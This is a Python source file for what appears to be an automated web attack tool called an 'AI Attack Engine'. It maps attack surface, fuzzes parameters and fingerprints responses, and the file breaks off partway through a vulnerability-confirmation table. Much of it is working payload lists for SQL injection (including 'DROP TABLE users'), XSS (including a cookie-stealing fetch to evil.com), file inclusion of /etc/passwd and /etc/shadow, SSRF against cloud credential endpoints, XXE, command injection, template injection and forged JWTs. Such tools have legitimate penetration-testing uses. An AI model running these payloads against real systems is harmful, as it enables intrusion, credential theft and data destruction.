"""
Quantum Protocol v5.0 — AI Attack Engine
Provides AI-driven attack surface analysis, payload generation, adaptive fuzzing,
vulnerability confirmation, response intelligence, and attack memory.
"""

import re
import json
import time
import uuid
import hashlib
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field, asdict
from urllib.parse import urlparse, parse_qs, urlencode

try:
    from backend.ai_remediation import ai_service
except ImportError:
    try:
        from ai_remediation import ai_service
    except ImportError:
        ai_service = None


# ═══════════════════════════════════════════════════════════════════════════════
# Data Models
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class AttackVector:
    category: str        # e.g. "SQL Injection", "XSS", "IDOR"
    subcategory: str     # e.g. "Time-Based Blind", "Reflected", "Numeric ID"
    confidence: float    # 0.0-1.0
    target: str          # parameter/header/cookie name
    location: str        # "param", "header", "cookie", "body", "path"
    reason: str          # why this was flagged
    payloads: List[str] = field(default_factory=list)


@dataclass
class FuzzResult:
    payload: str
    original_value: str
    parameter: str
    status_code: int
    response_length: int
    response_time_ms: int
    anomaly: bool
    anomaly_type: str = ""
    evidence: str = ""


@dataclass
class VerificationStep:
    step_number: int
    payload: str
    expected: str
    actual: str
    matched: bool
    response_code: int
    response_time_ms: int
    response_length: int


@dataclass
class ConfirmedVuln:
    vuln_type: str
    endpoint: str
    parameter: str
    confidence: str  # "High", "Medium", "Low"
    steps: List[VerificationStep] = field(default_factory=list)
    proof: str = ""
    exploit_options: List[Dict[str, str]] = field(default_factory=list)


@dataclass
class ResponseIntelligence:
    patterns: List[Dict[str, str]]  # detected patterns in response
    database_type: str = ""
    framework: str = ""
    internal_ips: List[str] = field(default_factory=list)
    tokens_exposed: List[str] = field(default_factory=list)
    stack_trace: bool = False
    reflected_params: List[str] = field(default_factory=list)
    security_headers_missing: List[str] = field(default_factory=list)


@dataclass
class AttackGraphNode:
    path: str
    vulns: List[str] = field(default_factory=list)
    severity: str = "info"
    children: List["AttackGraphNode"] = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════════════════
# Attack Surface Analyzer
# ═══════════════════════════════════════════════════════════════════════════════

class AttackSurfaceAnalyzer:
    """Analyzes HTTP requests to identify attack surface and recommend tests."""

    # Parameter name patterns that suggest vulnerability types
    PARAM_PATTERNS = {
        "sqli": [
            r"(?i)^(id|user_?id|item_?id|product_?id|order_?id|cat_?id|page|sort|order_?by|"
            r"group_?by|limit|offset|filter|where|column|table|select|search|query|q|keyword)$"
        ],
        "xss": [
            r"(?i)^(q|query|search|keyword|term|name|title|comment|message|text|content|"
            r"description|value|input|data|body|html|template|callback|redirect_?url|"
            r"return_?url|next|url|path|ref|referrer|src|href|action|onerror|onload)$"
        ],
        "lfi": [
            r"(?i)^(file|filename|path|filepath|dir|directory|folder|doc|document|template|"
            r"page|include|load|read|view|download|attachment|img|image|src|resource|lang|locale)$"
        ],
        "ssrf": [
            r"(?i)^(url|uri|link|href|src|source|target|dest|destination|domain|host|"
            r"proxy|callback|webhook|redirect|fetch|load|import|api|endpoint|service)$"
        ],
        "idor": [
            r"(?i)^(id|user_?id|account_?id|profile_?id|uid|pid|oid|ref|reference|"
            r"number|num|no|code|key|token|uuid|guid)$"
        ],
        "auth_bypass": [
            r"(?i)^(username|user|login|email|password|passwd|pass|pwd|token|session|"
            r"auth|api_?key|access_?token|bearer|jwt|cookie|role|admin|is_?admin|privilege)$"
        ],
        "rce": [
            r"(?i)^(cmd|command|exec|execute|run|shell|system|ping|ip|host|"
            r"process|eval|code|expression|script|program|action|func|function)$"
        ],
        "ssti": [
            r"(?i)^(template|tpl|view|render|layout|theme|skin|format|expression|"
            r"name|title|message|greeting|subject|content|text|email_?body)$"
        ],
    }

    # Header patterns suggesting attack vectors
    HEADER_PATTERNS = {
        "auth_bypass": ["authorization", "x-api-key", "x-auth-token", "cookie", "x-forwarded-for"],
        "injection": ["x-forwarded-host", "x-forwarded-for", "x-original-url", "x-rewrite-url", "referer", "origin"],
        "cache_poison": ["x-forwarded-host", "x-forwarded-scheme", "x-forwarded-proto", "x-host"],
    }

    # Body content patterns
    BODY_PATTERNS = {
        "json_injection": [r'"[^"]+"\s*:\s*"[^"]*"', r'\{.*\}'],
        "xml_injection": [r'<\?xml', r'<[a-zA-Z]+>', r'<!DOCTYPE'],
        "graphql": [r'query\s*\{', r'mutation\s*\{', r'"query"\s*:'],
    }

    @staticmethod
    def analyze(method: str, url: str, headers: Dict[str, str],
                cookies: Dict[str, str], body: str,
                params: Dict[str, str]) -> List[AttackVector]:
        """Analyze request and return identified attack vectors."""
        vectors: List[AttackVector] = []
        analyzer = AttackSurfaceAnalyzer

        # Parse URL for path analysis
        parsed = urlparse(url)
        path_parts = [p for p in parsed.path.split("/") if p]

        # 1. Analyze query parameters
        all_params = dict(params)
        if parsed.query:
            for k, v_list in parse_qs(parsed.query).items():
                if k not in all_params:
                    all_params[k] = v_list[0] if v_list else ""

        for param_name, param_value in all_params.items():
            for vuln_type, patterns in analyzer.PARAM_PATTERNS.items():
                for pattern in patterns:
                    if re.match(pattern, param_name):
                        payloads = PayloadGenerator.generate(vuln_type, param_value, "param")
                        vectors.append(AttackVector(
                            category=_VULN_DISPLAY_NAMES.get(vuln_type, vuln_type),
                            subcategory=_get_subcategory(vuln_type, param_value),
                            confidence=0.7,
                            target=param_name,
                            location="param",
                            reason=f"Parameter name '{param_name}' matches {vuln_type} target pattern",
                            payloads=payloads[:8],
                        ))
                        break

            # Check for numeric values (IDOR candidate)
            if param_value.isdigit() and "idor" not in [v.category.lower() for v in vectors if v.target == param_name]:
                vectors.append(AttackVector(
                    category="IDOR",
                    subcategory="Numeric ID Enumeration",
                    confidence=0.6,
                    target=param_name,
                    location="param",
                    reason=f"Numeric value '{param_value}' suggests enumerable resource ID",
                    payloads=[str(int(param_value) + i) for i in [-1, 1, 0, 100, 99999]],
                ))

        # 2. Analyze headers
        for header_name, header_value in headers.items():
            h_lower = header_name.lower()
            for vuln_type, h_patterns in analyzer.HEADER_PATTERNS.items():
                if h_lower in h_patterns:
                    payloads = PayloadGenerator.generate_header_payloads(h_lower, header_value)
                    vectors.append(AttackVector(
                        category=_VULN_DISPLAY_NAMES.get(vuln_type, vuln_type),
                        subcategory="Header Injection",
                        confidence=0.5,
                        target=header_name,
                        location="header",
                        reason=f"Header '{header_name}' is a known attack surface",
                        payloads=payloads[:6],
                    ))
                    break

        # 3. Analyze cookies
        for cookie_name, cookie_value in cookies.items():
            # JWT detection
            if cookie_value.count(".") == 2 and len(cookie_value) > 30:
                vectors.append(AttackVector(
                    category="Authentication Bypass",
                    subcategory="JWT Manipulation",
                    confidence=0.8,
                    target=cookie_name,
                    location="cookie",
                    reason=f"Cookie '{cookie_name}' appears to be a JWT token",
                    payloads=[
                        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
                        cookie_value.rsplit(".", 1)[0] + ".invalid_signature",
                    ],
                ))

            # Session ID patterns
            if re.match(r"(?i)(sess|session|sid|phpsessid|jsessionid|asp\.net_sessionid)", cookie_name):
                vectors.append(AttackVector(
                    category="Session Fixation",
                    subcategory="Session ID Manipulation",
                    confidence=0.5,
                    target=cookie_name,
                    location="cookie",
                    reason=f"Cookie '{cookie_name}' is a session identifier",
                    payloads=["", "a" * 32, "00000000000000000000000000000000"],
                ))

        # 4. Analyze body
        if body:
            # JSON body
            try:
                json_body = json.loads(body)
                if isinstance(json_body, dict):
                    for key, value in json_body.items():
                        for vuln_type, patterns in analyzer.PARAM_PATTERNS.items():
                            for pattern in patterns:
                                if re.match(pattern, key):
                                    payloads = PayloadGenerator.generate(vuln_type, str(value), "body")
                                    vectors.append(AttackVector(
                                        category=_VULN_DISPLAY_NAMES.get(vuln_type, vuln_type),
                                        subcategory=_get_subcategory(vuln_type, str(value)),
                                        confidence=0.7,
                                        target=key,
                                        location="body",
                                        reason=f"JSON body key '{key}' matches {vuln_type} pattern",
                                        payloads=payloads[:8],
                                    ))
                                    break
            except (json.JSONDecodeError, ValueError):
                pass

            # GraphQL detection
            if re.search(r'(?:query|mutation)\s*[\({]', body) or '"query"' in body:
                vectors.append(AttackVector(
                    category="GraphQL Injection",
                    subcategory="Introspection / Query Manipulation",
                    confidence=0.7,
                    target="graphql_query",
                    location="body",
                    reason="Request body contains GraphQL query structure",
                    payloads=[
                        '{"query":"{ __schema { types { name } } }"}',
                        '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
                        '{"query":"mutation { deleteUser(id: 1) { success } }"}',
                    ],
                ))

            # XML detection
            if body.strip().startswith("<?xml") or body.strip().startswith("<"):
                vectors.append(AttackVector(
                    category="XXE Injection",
                    subcategory="XML External Entity",
                    confidence=0.7,
                    target="xml_body",
                    location="body",
                    reason="Request body contains XML content",
                    payloads=[
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                    ],
                ))

        # 5. Analyze URL path segments
        for i, segment in enumerate(path_parts):
            if segment.isdigit():
                vectors.append(AttackVector(
                    category="IDOR",
                    subcategory="Path-Based ID Enumeration",
                    confidence=0.6,
                    target=f"path_segment_{i}",
                    location="path",
                    reason=f"Numeric path segment '/{segment}' suggests enumerable resource",
                    payloads=[
                        parsed.path.replace(f"/{segment}", f"/{int(segment) + 1}"),
                        parsed.path.replace(f"/{segment}", f"/{int(segment) - 1}"),
                        parsed.path.replace(f"/{segment}", "/0"),
                    ],
                ))

            # API version path
            if re.match(r"v\d+", segment):
                vectors.append(AttackVector(
                    category="API Misconfiguration",
                    subcategory="Version Enumeration",
                    confidence=0.4,
                    target=f"path_segment_{i}",
                    location="path",
                    reason=f"API version segment '/{segment}' — test older versions",
                    payloads=[
                        parsed.path.replace(f"/{segment}", "/v1"),
                        parsed.path.replace(f"/{segment}", "/v0"),
                    ],
                ))

        # 6. Method-specific checks
        if method.upper() in ("POST", "PUT", "PATCH") and not body:
            vectors.append(AttackVector(
                category="Input Validation",
                subcategory="Empty Body Handling",
                confidence=0.3,
                target="request_body",
                location="body",
                reason="Mutation method with empty body — test error handling",
                payloads=["", "{}", "[]", "null", '{"__proto__":{"admin":true}}'],
            ))

        # Deduplicate by (category, target)
        seen = set()
        unique_vectors = []
        for v in vectors:
            key = (v.category, v.target, v.location)
            if key not in seen:
                seen.add(key)
                unique_vectors.append(v)

        return sorted(unique_vectors, key=lambda x: -x.confidence)


# ═══════════════════════════════════════════════════════════════════════════════
# Payload Generator
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadGenerator:
    """Context-aware payload generation engine."""

    PAYLOADS = {
        "sqli": {
            "numeric": [
                "1 OR 1=1", "1 OR 1=1--", "1 OR 1=1#",
                "1 UNION SELECT NULL", "1 UNION SELECT NULL,NULL",
                "1 UNION SELECT NULL,NULL,NULL",
                "0 OR SLEEP(5)", "1; WAITFOR DELAY '0:0:5'",
                "1' OR '1'='1", "1) OR (1=1",
                "1 AND 1=2 UNION SELECT 1,2,3--",
                "-1 OR 1=1", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
                "1;SELECT IF(1=1,SLEEP(5),0)",
            ],
            "string": [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
                "' UNION SELECT NULL--", "'; DROP TABLE users--",
                "admin'--", "' AND '1'='2", "' AND SLEEP(5)--",
                "' OR 1=1 LIMIT 1--", "' AND 1=CONVERT(int,@@version)--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' OR '' = '", "') OR ('1'='1",
                "1' ORDER BY 1--", "1' ORDER BY 10--",
                "' UNION SELECT username,password FROM users--",
            ],
            "generic": [
                "' OR 1=1--", "1 OR 1=1", "' OR ''='",
                "\" OR \"\"=\"", "admin' OR '1'='1",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
            ],
        },
        "xss": {
            "reflected": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "javascript:alert(1)",
                "<details open ontoggle=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "'-alert(1)-'", "\"-alert(1)-\"",
            ],
            "dom": [
                "#<img src=x onerror=alert(1)>",
                "javascript:alert(document.domain)",
                "<img src=x onerror=fetch('https://evil.com/'+document.cookie)>",
            ],
            "filter_bypass": [
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<img/src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}", "#{alert(1)}",
            ],
        },
        "lfi": {
            "unix": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc/passwd",
                "/etc/passwd",
                "../../../../etc/shadow",
                "../../../../proc/self/environ",
                "../../../../var/log/apache2/access.log",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain,<?php system('id');?>",
            ],
            "windows": [
                "..\\..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\windows\\win.ini",
                "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
                "C:\\windows\\win.ini",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            ],
            "generic": [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%00",
                "php://filter/convert.base64-encode/resource=../config",
            ],
        },
        "ssrf": {
            "internal": [
                "http://127.0.0.1",
                "http://localhost",
                "http://0.0.0.0",
                "http://[::1]",
                "http://127.0.0.1:8080/admin",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:6379",
                "http://localhost:9200/_cat/indices",
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
            ],
            "bypass": [
                "http://0x7f000001",
                "http://0177.0.0.1",
                "http://2130706433",
                "http://127.1",
                "http://127.0.0.1.nip.io",
            ],
        },
        "idor": {
            "numeric": [
                "0", "1", "2", "-1", "99999", "100000",
                "null", "undefined", "NaN",
            ],
            "uuid": [
                "00000000-0000-0000-0000-000000000000",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
            ],
        },
        "auth_bypass": {
            "header": [
                "", "null", "undefined", "Bearer null",
                "Bearer ", "Basic YWRtaW46YWRtaW4=",
                "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            ],
        },
        "rce": {
            "unix": [
                "; id", "| id", "$(id)", "`id`",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "&& id", "|| id",
                "; sleep 5", "| sleep 5",
                "$(sleep 5)", "`sleep 5`",
                ";ls -la", "| whoami",
            ],
            "windows": [
                "& dir", "| dir", "&& dir",
                "& type C:\\windows\\win.ini",
                "| ping -n 5 127.0.0.1",
                "& timeout /t 5",
            ],
        },
        "ssti": {
            "generic": [
                "{{7*7}}", "${7*7}", "#{7*7}",
                "<%= 7*7 %>", "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{config}}", "{{self}}", "{{request}}",
                "{{''.__class__}}", "{{lipsum.__globals__}}",
                "*{T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            ],
        },
    }

    @classmethod
    def generate(cls, vuln_type: str, current_value: str, location: str) -> List[str]:
        """Generate context-aware payloads based on vulnerability type and current value."""
        payloads_dict = cls.PAYLOADS.get(vuln_type, {})
        if not payloads_dict:
            return []

        # Determine subcategory based on value type
        if current_value.isdigit():
            sub = "numeric"
        elif current_value.startswith("/") or ".." in current_value:
            sub = "unix" if "/" in current_value else "windows"
        elif current_value.startswith("http"):
            sub = "internal"
        else:
            sub = "string"

        # Get matching payloads, fall back to generic
        result = list(payloads_dict.get(sub, []))
        if not result:
            result = list(payloads_dict.get("generic", []))
        if not result:
            # Flatten all subcategories
            for plist in payloads_dict.values():
                result.extend(plist)

        return result[:15]

    @classmethod
    def generate_header_payloads(cls, header_name: str, current_value: str) -> List[str]:
        """Generate payloads specific to header injection."""
        h = header_name.lower()
        payloads = []

        if h in ("x-forwarded-for", "x-real-ip"):
            payloads = [
                "127.0.0.1", "localhost", "0.0.0.0",
                "127.0.0.1, 10.0.0.1", "::1",
                "127.0.0.1\r\nX-Admin: true",
            ]
        elif h in ("x-forwarded-host", "x-host"):
            payloads = [
                "evil.com", "localhost", "127.0.0.1",
                "evil.com\r\nX-Injected: true",
            ]
        elif h == "authorization":
            payloads = cls.PAYLOADS.get("auth_bypass", {}).get("header", [])
        elif h == "referer":
            payloads = [
                "https://evil.com", "javascript:alert(1)",
                "https://admin.internal", "",
            ]
        elif h == "origin":
            payloads = [
                "https://evil.com", "null",
                "https://evil.com.target.com",
            ]
        else:
            payloads = [
                current_value + "\r\nX-Injected: true",
                "' OR '1'='1", "<script>alert(1)</script>",
            ]

        return payloads

    @classmethod
    def generate_ai_payloads(cls, vuln_type: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate advanced AI-enhanced payloads with metadata."""
        base_payloads = cls.generate(
            vuln_type,
            context.get("current_value", ""),
            context.get("location", "param"),
        )

        result = []
        for i, payload in enumerate(base_payloads):
            result.append({
                "id": f"p-{i+1}",
                "payload": payload,
                "category": vuln_type,
                "risk_level": "high" if i < 3 else "medium" if i < 8 else "low",
                "description": _describe_payload(vuln_type, payload),
                "encoding": "none",
                "encoded_variants": _generate_encoded_variants(payload),
            })

        return result


# ═══════════════════════════════════════════════════════════════════════════════
# Adaptive Fuzzing Engine
# ═══════════════════════════════════════════════════════════════════════════════

class AdaptiveFuzzer:
    """AI-guided adaptive fuzzing engine that mutates parameters and analyzes responses."""

    # Mutation strategies
    MUTATIONS = {
        "append_quote": lambda v: v + "'",
        "append_double_quote": lambda v: v + '"',
        "append_backslash": lambda v: v + "\\",
        "sqli_or": lambda v: v + " OR 1=1",
        "sqli_and_sleep": lambda v: v + "' AND SLEEP(5)",
        "sqli_comment": lambda v: v + "--",
        "sqli_union": lambda v: v + " UNION SELECT NULL",
        "xss_script": lambda v: v + "<script>alert(1)</script>",
        "xss_img": lambda v: v + '"><img src=x onerror=alert(1)>',
        "xss_svg": lambda v: v + "<svg/onload=alert(1)>",
        "ssti_jinja": lambda v: "{{7*7}}",
        "ssti_dollar": lambda v: "${7*7}",
        "lfi_etc_passwd": lambda v: "../../../../etc/passwd",
        "lfi_win_ini": lambda v: "..\\..\\..\\..\\windows\\win.ini",
        "rce_semicolon": lambda v: v + "; id",
        "rce_pipe": lambda v: v + " | id",
        "rce_backtick": lambda v: "`sleep 5`",
        "null_byte": lambda v: v + "%00",
        "overflow": lambda v: "A" * 5000,
        "negative": lambda v: "-1",
        "zero": lambda v: "0",
        "large_number": lambda v: "99999999",
        "empty": lambda v: "",
        "json_inject": lambda v: '{"$gt":""}',
        "nosql_inject": lambda v: '{"$ne":null}',
        "proto_pollution": lambda v: '{"__proto__":{"admin":true}}',
        "unicode_bypass": lambda v: v.replace("a", "\u0061\u0300") if v else v,
        "double_encode": lambda v: v.replace("'", "%2527"),
    }

    @classmethod
    def generate_mutations(cls, param_name: str, original_value: str,
                           vuln_types: Optional[List[str]] = None) -> List[Dict[str, str]]:
        """Generate parameter mutations for fuzzing."""
        mutations = []

        # Select relevant mutation strategies
        if vuln_types:
            relevant_keys = set()
            for vt in vuln_types:
                vt_lower = vt.lower()
                if "sql" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "sqli" in k or k in ("append_quote", "append_double_quote"))
                elif "xss" in vt_lower or "cross" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "xss" in k)
                elif "ssti" in vt_lower or "template" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "ssti" in k)
                elif "lfi" in vt_lower or "path" in vt_lower or "traversal" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "lfi" in k)
                elif "rce" in vt_lower or "command" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "rce" in k)
                elif "nosql" in vt_lower:
                    relevant_keys.update(k for k in cls.MUTATIONS if "nosql" in k or "json" in k)
            # Always include generic mutations
            relevant_keys.update(["empty", "null_byte", "overflow", "negative", "zero", "large_number"])
        else:
            relevant_keys = set(cls.MUTATIONS.keys())

        for mut_name in relevant_keys:
            if mut_name in cls.MUTATIONS:
                try:
                    mutated = cls.MUTATIONS[mut_name](original_value)
                    mutations.append({
                        "mutation": mut_name,
                        "parameter": param_name,
                        "original": original_value,
                        "mutated": mutated,
                    })
                except Exception:
                    pass

        return mutations

    @classmethod
    def analyze_fuzz_response(cls, baseline_status: int, baseline_length: int,
                              baseline_time_ms: int, fuzz_status: int,
                              fuzz_length: int, fuzz_time_ms: int,
                              fuzz_body: str, payload: str) -> Dict[str, Any]:
        """Analyze a fuzzed response for anomalies."""
        anomalies = []
        anomaly_score = 0.0

        # Status code change
        if fuzz_status != baseline_status:
            anomalies.append({
                "type": "status_change",
                "detail": f"Status changed from {baseline_status} to {fuzz_status}",
                "severity": "high" if fuzz_status >= 500 else "medium",
            })
            anomaly_score += 0.4 if fuzz_status >= 500 else 0.2

        # Response length anomaly (>20% change)
        if baseline_length > 0:
            length_ratio = abs(fuzz_length - baseline_length) / baseline_length
            if length_ratio > 0.2:
                anomalies.append({
                    "type": "length_anomaly",
                    "detail": f"Response length changed by {length_ratio:.0%} ({baseline_length} -> {fuzz_length})",
                    "severity": "medium",
                })
                anomaly_score += min(0.3, length_ratio * 0.5)

        # Timing anomaly (>3x slower or >3s absolute increase)
        time_delta = fuzz_time_ms - baseline_time_ms
        if time_delta > 3000 or (baseline_time_ms > 0 and fuzz_time_ms > baseline_time_ms * 3):
            anomalies.append({
                "type": "timing_anomaly",
                "detail": f"Response time increased by {time_delta}ms ({baseline_time_ms}ms -> {fuzz_time_ms}ms)",
                "severity": "high",
            })
            anomaly_score += 0.5

        # Error pattern detection in body
        error_patterns = [
            (r"SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|pg_query\(\)", "SQL Error Detected", "critical"),
            (r"Traceback \(most recent call last\)|at .+\.java:\d+|at .+\.py:\d+", "Stack Trace Exposed", "high"),
            (r"FATAL|PANIC|Segmentation fault|core dumped", "Server Crash Indicator", "critical"),
            (r"<script>alert\(1\)</script>|onerror=alert", "XSS Reflection Detected", "high"),
            (r"root:x:0:0:|/bin/bash|/bin/sh", "LFI Success (passwd)", "critical"),
            (r"\[fonts\]|\[extensions\]", "LFI Success (win.ini)", "critical"),
            (r"uid=\d+\(|gid=\d+\(", "RCE Success (id output)", "critical"),
            (r"49|7\*7\s*=\s*49", "SSTI Confirmed (7*7=49)", "critical"),
        ]

        for pattern, desc, severity in error_patterns:
            if re.search(pattern, fuzz_body, re.IGNORECASE):
                anomalies.append({
                    "type": "pattern_match",
                    "detail": desc,
                    "severity": severity,
                })
                anomaly_score += 0.6 if severity == "critical" else 0.4

        # Reflected payload detection
        if payload in fuzz_body:
            anomalies.append({
                "type": "reflection",
                "detail": f"Payload reflected in response body",
                "severity": "medium",
            })
            anomaly_score += 0.3

        return {
            "is_anomaly": anomaly_score > 0.2,
            "anomaly_score": min(1.0, anomaly_score),
            "anomalies": anomalies,
            "recommendation": _get_fuzz_recommendation(anomalies),
        }


# ═══════════════════════════════════════════════════════════════════════════════
# Response Intelligence Engine
# ═══════════════════════════════════════════════════════════════════════════════

class ResponseIntelligenceEngine:
    """Analyzes HTTP responses for security intelligence."""

    DB_PATTERNS = [
        (r"SQL syntax.*?MySQL|mysqli_", "MySQL"),
        (r"PostgreSQL.*?ERROR|pg_query", "PostgreSQL"),
        (r"ORA-\d{5}", "Oracle"),
        (r"Microsoft.*?ODBC.*?SQL Server|MSSQL", "Microsoft SQL Server"),
        (r"SQLite3|sqlite_", "SQLite"),
        (r"MongoDB|MongoError", "MongoDB"),
    ]

    FRAMEWORK_PATTERNS = [
        (r"X-Powered-By:\s*Express", "Express.js"),
        (r"X-Powered-By:\s*PHP", "PHP"),
        (r"Server:\s*Apache", "Apache"),
        (r"Server:\s*nginx", "Nginx"),
        (r"X-Powered-By:\s*ASP\.NET", "ASP.NET"),
        (r"Server:\s*Werkzeug|Server:\s*gunicorn", "Python/Flask"),
        (r"X-Powered-By:\s*Next\.js", "Next.js"),
        (r"Server:\s*Kestrel", ".NET Core"),
        (r"X-Django-|csrfmiddlewaretoken", "Django"),
        (r"laravel_session|X-Powered-By:\s*Laravel", "Laravel"),
        (r"Server:\s*Jetty|X-Powered-By:\s*Servlet", "Java/Servlet"),
    ]

    IP_PATTERN = re.compile(
        r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|"
        r"192\.168\.\d{1,3}\.\d{1,3})\b"
    )

    TOKEN_PATTERNS = [
        (r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", "JWT Token"),
        (r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}", "Stripe Key"),
        (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
        (r"ghp_[A-Za-z0-9]{36}", "GitHub Token"),
        (r"xox[baprs]-[A-Za-z0-9\-]{10,}", "Slack Token"),
    ]

    SECURITY_HEADERS = [
        "content-security-policy", "x-frame-options", "x-content-type-options",
        "strict-transport-security", "x-xss-protection", "referrer-policy",
        "permissions-policy",
    ]

    @classmethod
    def analyze(cls, status_code: int, headers: Dict[str, str],
                body: str, request_body: str = "") -> ResponseIntelligence:
        """Full response intelligence analysis."""
        patterns = []
        lower_headers = {k.lower(): v for k, v in headers.items()}
        combined = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())

        # Database detection
        db_type = ""
        for pattern, db_name in cls.DB_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                db_type = db_name
                patterns.append({"type": "database_fingerprint", "detail": f"Database: {db_name}", "severity": "high"})
                break

        # Framework detection
        framework = ""
        for pattern, fw_name in cls.FRAMEWORK_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                framework = fw_name
                patterns.append({"type": "framework_fingerprint", "detail": f"Framework: {fw_name}", "severity": "info"})
                break

        # SQL errors
        sql_patterns = [
            r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_", r"PostgreSQL.*?ERROR",
            r"ORA-\d{5}", r"Unclosed quotation mark", r"syntax error at or near",
        ]
        for sp in sql_patterns:
            match = re.search(sp, body, re.IGNORECASE)
            if match:
                patterns.append({
                    "type": "sql_error",
                    "detail": f"SQL Error: {match.group(0)[:100]}",
                    "severity": "critical",
                })
                break

        # Stack traces
        stack_trace = False
        stack_patterns = [
            r"Traceback \(most recent call last\)",
            r"at [\w.]+\([\w.]+\.java:\d+\)",
            r"at [\w.]+\.py:\d+",
            r"Exception in thread",
            r"System\.NullReferenceException",
        ]
        for sp in stack_patterns:
            if re.search(sp, body, re.IGNORECASE):
                stack_trace = True
                patterns.append({"type": "stack_trace", "detail": "Stack trace exposed in response", "severity": "high"})
                break

        # Internal IPs
        internal_ips = list(set(cls.IP_PATTERN.findall(combined)))
        if internal_ips:
            patterns.append({
                "type": "internal_ip_leak",
                "detail": f"Internal IPs: {', '.join(internal_ips[:5])}",
                "severity": "medium",
            })

        # Token exposure
        tokens = []
        for tp, label in cls.TOKEN_PATTERNS:
            matches = re.findall(tp, body)
            for m in matches[:2]:
                masked = m[:8] + "..." + m[-4:] if len(m) > 12 else m
                tokens.append(f"{label}: {masked}")
                patterns.append({"type": "token_exposure", "detail": f"{label} exposed", "severity": "critical"})

        # Reflected parameters
        reflected = []
        if request_body:
            try:
                if request_body.strip().startswith("{"):
                    req_json = json.loads(request_body)
                    if isinstance(req_json, dict):
                        for k, v in req_json.items():
                            if isinstance(v, str) and len(v) > 2 and v in body:
                                reflected.append(k)
                                patterns.append({
                                    "type": "reflection",
                                    "detail": f"Parameter '{k}' reflected in response",
                                    "severity": "medium",
                                })
            except (json.JSONDecodeError, ValueError):
                pass

        # Missing security headers
        missing_headers = []
        for h in cls.SECURITY_HEADERS:
            if h not in lower_headers:
                missing_headers.append(h)

        if missing_headers:
            patterns.append({
                "type": "missing_security_headers",
                "detail": f"Missing: {', '.join(missing_headers)}",
                "severity": "low",
            })

        return ResponseIntelligence(
            patterns=patterns,
            database_type=db_type,
            framework=framework,
            internal_ips=internal_ips,
            tokens_exposed=tokens,
            stack_trace=stack_trace,
            reflected_params=reflected,
            security_headers_missing=missing_headers,
        )


# ═══════════════════════════════════════════════════════════════════════════════
# Vulnerability Confirmation Engine
# ═══════════════════════════════════════════════════════════════════════════════

class VulnConfirmationEngine:
    """Generates multi-step verification sequences for suspected vulnerabilities."""

    VERIFICATION_SEQUENCES = {
        "SQL Injection": [
            {"payload_template": "{value}", "expected": "baseline", "desc": "Baseline request"},
            {"payload_template": "{value}'", "expected": "error_or_change", "desc": "Single quote test"},
